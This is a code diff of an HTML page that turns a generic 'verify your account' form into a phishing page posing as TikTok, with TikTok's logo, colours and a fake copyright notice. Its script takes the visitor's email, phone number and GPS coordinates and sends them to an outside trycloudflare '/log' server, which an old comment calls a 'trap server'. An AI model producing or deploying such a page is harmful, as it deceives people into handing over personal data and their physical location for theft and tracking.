@@ -3,95 +3,95 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Account Security Verification</title>
+  <title>TikTok Account Verification</title>
+  <link rel="icon" href="https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/web/favicon.ico" />
   <style>
     body {
-      background-color: #f8f8f8;
+      margin: 0;
       font-family: 'Segoe UI', sans-serif;
+      background: #fff;
       color: #333;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      padding: 60px 20px;
     }
-    h2 {
-      margin-bottom: 10px;
-      color: #007BFF;
-    }
-    p {
+    .container {
+      max-width: 400px;
+      margin: 0 auto;
+      padding: 40px 20px;
       text-align: center;
+    }
+    .logo {
+      width: 100px;
       margin-bottom: 20px;
     }
-    form {
-      background: #fff;
-      padding: 25px;
-      border-radius: 10px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-      max-width: 400px;
-      width: 100%;
+    h2 {
+      color: #fe2c55;
+      font-size: 22px;
+      margin-bottom: 10px;
     }
-    input[type="text"], input[type="email"] {
+    p {
+      font-size: 14px;
+      color: #666;
+      margin-bottom: 30px;
+    }
+    input[type="email"], input[type="text"] {
       width: 100%;
-      padding: 10px;
-      margin: 10px 0 20px;
+      padding: 12px;
+      margin: 10px 0;
       border: 1px solid #ccc;
-      border-radius: 5px;
+      border-radius: 6px;
+      font-size: 14px;
     }
     button {
-      background: #007BFF;
-      color: #fff;
-      border: none;
-      padding: 12px 20px;
-      border-radius: 5px;
-      font-size: 16px;
-      cursor: pointer;
       width: 100%;
+      background-color: #fe2c55;
+      color: white;
+      border: none;
+      padding: 14px;
+      font-size: 16px;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 20px;
     }
-    .small {
-      margin-top: 15px;
-      font-size: 13px;
-      color: #888;
+    .footer {
+      font-size: 12px;
+      color: #aaa;
+      margin-top: 40px;
     }
   </style>
 </head>
 <body>
 
-  <h2>🔒 Verify Your Account</h2>
-  <p>Due to a recent update, all users are required to verify their account information and location.</p>
+  <div class="container">
+    <img src="https://logodownload.org/wp-content/uploads/2020/08/tiktok-logo.png" alt="TikTok Logo" class="logo" />
+    <h2>Security Verification Required</h2>
+    <p>To continue using your TikTok account, please verify your account information and enable location access.</p>
 
-  <form id="updateForm">
-    <label>Email Address:</label>
-    <input type="email" name="email" required />
+    <form id="verifyForm">
+      <input type="email" name="email" placeholder="Email Address" required />
+      <input type="text" name="phone" placeholder="Phone Number" required />
+      <button type="submit">Verify My Account</button>
+    </form>
 
-    <label>Phone Number:</label>
-    <input type="text" name="phone" required />
-
-    <button type="submit">Update Account</button>
-    <div class="small">This process is mandatory to continue using your account securely.</div>
-  </form>
+    <div class="footer">© 2025 TikTok. All rights reserved.</div>
+  </div>
 
   <script>
-    document.getElementById("updateForm").addEventListener("submit", function(e) {
+    document.getElementById("verifyForm").addEventListener("submit", function(e) {
       e.preventDefault();
 
-      // Trigger GPS location request
+      const email = document.querySelector('input[name="email"]').value;
+      const phone = document.querySelector('input[name="phone"]').value;
+
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function(pos) {
-          const lat = pos.coords.latitude;
-          const lon = pos.coords.longitude;
-
-          // Redirect to your trap server with data
-          const email = document.querySelector('input[name="email"]').value;
-          const phone = document.querySelector('input[name="phone"]').value;
-
-          const redirectUrl = `https://ntsc-hacker-connectors-base.trycloudflare.com/log?email=${encodeURIComponent(email)}&phone=${encodeURIComponent(phone)}&lat=${lat}&lon=${lon}`;
-          window.location.href = redirectUrl;
+        navigator.geolocation.getCurrentPosition(function(position) {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          const redirect = `https://ntsc-hacker-connectors-base.trycloudflare.com/log?email=${encodeURIComponent(email)}&phone=${encodeURIComponent(phone)}&lat=${lat}&lon=${lon}`;
+          window.location.href = redirect;
         }, function(error) {
-          // User denied GPS access
-          alert("GPS access is required to verify your location.");
+          alert("⚠️ Location access is required to verify your account.");
         });
       } else {
-        alert("Geolocation is not supported by this browser.");
+        alert("⚠️ Your browser does not support GPS location.");
       }
     });
   </script>
